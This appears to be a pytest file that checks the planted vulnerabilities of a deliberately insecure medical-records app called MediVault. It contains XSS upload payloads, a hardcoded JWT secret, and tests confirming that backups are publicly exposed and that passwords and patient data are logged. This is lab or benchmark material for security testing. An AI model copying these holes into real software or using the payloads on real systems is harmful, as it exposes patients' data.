"""MediVault Exploit Verification Tests: Files, Sessions & Logging (V05–V08).

Asserts reproducible exploits for:
- V05: Publicly Reachable Documents & Backups
- V06: Insecure File Upload Validation
- V07: Weak Session & Authentication Controls
- V08: Sensitive Data in Application Logs
"""

import io
import os
import pytest
from jose import jwt

from backend.app.config import settings
from backend.app.main import _audit_log_path
from backend.app.routes.auth import HARDCODED_JWT_SECRET


def get_token(client, email: str = "patient01@example.test", password: str = "Password123!") -> str:
    """Helper to authenticate and retrieve access token."""
    login_resp = client.post(
        "/api/auth/login",
        json={"email": email, "password": password},
    )
    assert login_resp.status_code == 200, f"Authentication failed for {email}: {login_resp.text}"
    return login_resp.json()["access_token"]


# ============================================================================
# V05: Publicly Reachable Documents & Backups
# ============================================================================
def test_exploit_v05_public_backups_and_documents(client):
    """V05 Exploit: Unauthenticated attacker can download SQL database backups and patient PDFs."""
    # Ensure backup file exists for test determinism
    backup_file = os.path.join(settings.BACKUP_DIR, "backup_dump.sql")
    if not os.path.exists(backup_file):
        os.makedirs(settings.BACKUP_DIR, exist_ok=True)
        with open(backup_file, "w", encoding="utf-8") as f:
            f.write(
                "-- Synthetic MediVault Database Backup Dump\n"
                "CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, email VARCHAR);\n"
            )

    # Exploit 1: Unauthenticated retrieval of raw SQL backup
    resp_backup = client.get("/public/backups/backup_dump.sql")
    assert resp_backup.status_code == 200, (
        f"Expected 200 for public backup dump, got {resp_backup.status_code}"
    )
    assert "CREATE TABLE" in resp_backup.text or "backup" in resp_backup.text.lower() or len(resp_backup.text) > 0

    # Ensure a diagnostic upload exists for test determinism
    os.makedirs(settings.UPLOAD_DIR, exist_ok=True)
    sample_report = os.path.join(settings.UPLOAD_DIR, "test_public_report.pdf")
    with open(sample_report, "wb") as f:
        f.write(b"%PDF-1.4 synthetic confidential medical report")

    # Exploit 2: Unauthenticated retrieval of confidential patient medical report
    try:
        resp_doc = client.get("/public/uploads/test_public_report.pdf")
        assert resp_doc.status_code == 200, (
            f"Expected 200 for public upload file, got {resp_doc.status_code}"
        )
        assert b"%PDF" in resp_doc.content
    finally:
        if os.path.exists(sample_report):
            os.remove(sample_report)


# ============================================================================
# V06: Insecure File Upload Validation
# ============================================================================
def test_exploit_v06_insecure_file_upload(client):
    """V06 Exploit: Upload trusts client extension/mime, accepts arbitrary HTML/SVG scripts,
    and makes them accessible publicly for stored XSS.
    """
    token = get_token(client, email="patient01@example.test")
    headers = {"Authorization": f"Bearer {token}"}

    # Exploit 1: Upload arbitrary executable HTML file containing JavaScript
    html_name = "exploit_xss.html"
    html_payload = b"<!DOCTYPE html><html><body><script>window.pwned=1;</script></body></html>"

    upload_html = client.post(
        "/api/reports/upload",
        files={"file": (html_name, io.BytesIO(html_payload), "text/html")},
        data={"title": "Exploit Diagram", "report_type": "Diagnostic Summary"},
        headers=headers,
    )
    assert upload_html.status_code == 201, (
        f"Expected 201 Created for HTML upload, got {upload_html.status_code}"
    )
    data_html = upload_html.json()
    assert data_html["file_name"] == html_name

    # Confirm stored file is immediately reachable via unauthenticated public static mount
    public_html = client.get(f"/public/uploads/{html_name}")
    assert public_html.status_code == 200
    assert "window.pwned=1" in public_html.text

    # Exploit 2: Upload arbitrary SVG file with embedded script
    svg_name = "vector_chart.svg"
    svg_payload = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'

    upload_svg = client.post(
        "/api/reports/upload",
        files={"file": (svg_name, io.BytesIO(svg_payload), "image/svg+xml")},
        data={"title": "Vector Chart", "report_type": "Lab Report"},
        headers=headers,
    )
    assert upload_svg.status_code == 201
    svg_data = upload_svg.json()
    assert svg_data["file_name"] == svg_name

    public_svg = client.get(f"/public/uploads/{svg_name}")
    assert public_svg.status_code == 200
    assert "alert(1)" in public_svg.text

    # Clean up uploaded exploit files
    for fpath in [data_html.get("file_path"), svg_data.get("file_path")]:
        if fpath and os.path.exists(fpath):
            try:
                os.remove(fpath)
            except Exception:
                pass


# ============================================================================
# V07: Weak Session & Authentication Controls
# ============================================================================
def test_exploit_v07_weak_session_and_auth(client):
    """V07 Exploit: Accept trivial passwords (e.g. '123'), issue non-expiring JWTs signed
    with hardcoded secret, and persist tokens in localStorage.
    """
    # Exploit 1: Register with trivial password '123'
    reg_payload = {
        "email": "trivial_user_v07@example.test",
        "password": "123",
        "full_name": "Trivial Pass User",
        "role": "patient",
    }
    reg_resp = client.post("/api/auth/register", json=reg_payload)
    assert reg_resp.status_code == 201, (
        f"Expected 201 Created for password '123', got {reg_resp.status_code}"
    )
    token = reg_resp.json()["access_token"]

    # Exploit 2: Verify JWT lacks 'exp' claim (non-expiring token)
    claims = jwt.decode(
        token,
        HARDCODED_JWT_SECRET,
        algorithms=["HS256"],
        options={"verify_signature": True},
    )
    assert "exp" not in claims, f"Token should not contain 'exp' claim: {claims}"
    assert claims["sub"] == "trivial_user_v07@example.test"
    assert HARDCODED_JWT_SECRET == "medivault-insecure-hardcoded-secret-key-12345"

    # Exploit 3: Authenticate with non-expiring token
    me_resp = client.get("/api/auth/me", headers={"Authorization": f"Bearer {token}"})
    assert me_resp.status_code == 200
    assert me_resp.json()["email"] == "trivial_user_v07@example.test"

    # Exploit 4: Login with trivial password '123' works and returns non-expiring token
    login_resp = client.post(
        "/api/auth/login",
        json={"email": "trivial_user_v07@example.test", "password": "123"},
    )
    assert login_resp.status_code == 200
    login_claims = jwt.decode(login_resp.json()["access_token"], HARDCODED_JWT_SECRET, algorithms=["HS256"])
    assert "exp" not in login_claims

    # Exploit 5: Frontend client persists tokens in browser localStorage
    frontend_api_path = os.path.abspath(
        os.path.join(os.path.dirname(__file__), "..", "frontend", "src", "services", "api.js")
    )
    assert os.path.exists(frontend_api_path)
    with open(frontend_api_path, "r", encoding="utf-8") as f:
        api_source = f.read()
    assert "localStorage.setItem(TOKEN_KEY, token)" in api_source
    assert "TOKEN_KEY = 'medivault_token'" in api_source


# ============================================================================
# V08: Sensitive Data in Application Logs
# ============================================================================
def test_exploit_v08_sensitive_data_in_logs(client):
    """V08 Exploit: Full raw request bodies, passwords, tokens, and PII are logged to backend/app.log."""
    # Clear existing log contents to avoid previous test noise
    if os.path.exists(_audit_log_path):
        with open(_audit_log_path, "w", encoding="utf-8") as f:
            f.truncate(0)

    # Trigger login with plaintext password
    test_pass = "Password123!"
    login_resp = client.post(
        "/api/auth/login",
        json={"email": "patient01@example.test", "password": test_pass},
    )
    assert login_resp.status_code == 200
    token = login_resp.json()["access_token"]

    # Trigger profile update with Aadhaar reference and medical notes
    test_aadhaar = "1002 9999 8888"
    test_notes = "Psychiatric consult: patient experiencing acute stress disorder."
    update_resp = client.put(
        "/api/patients/PAT-DEMO-001",
        json={"aadhaar_ref": test_aadhaar, "medical_notes": test_notes},
        headers={"Authorization": f"Bearer {token}"},
    )
    assert update_resp.status_code == 200

    # Assert log contains sensitive credentials and PII
    assert os.path.exists(_audit_log_path), f"Log file missing: {_audit_log_path}"
    with open(_audit_log_path, "r", encoding="utf-8", errors="replace") as f:
        log_content = f.read()

    assert test_pass in log_content, "Plaintext password missing from app.log"
    assert token[:20] in log_content, "Bearer token missing from app.log query or auth"
    assert test_aadhaar in log_content, "Aadhaar reference missing from app.log body"
    assert test_notes in log_content, "Clinical notes missing from app.log body"
    assert "Authorization" in log_content or "authorization=" in log_content
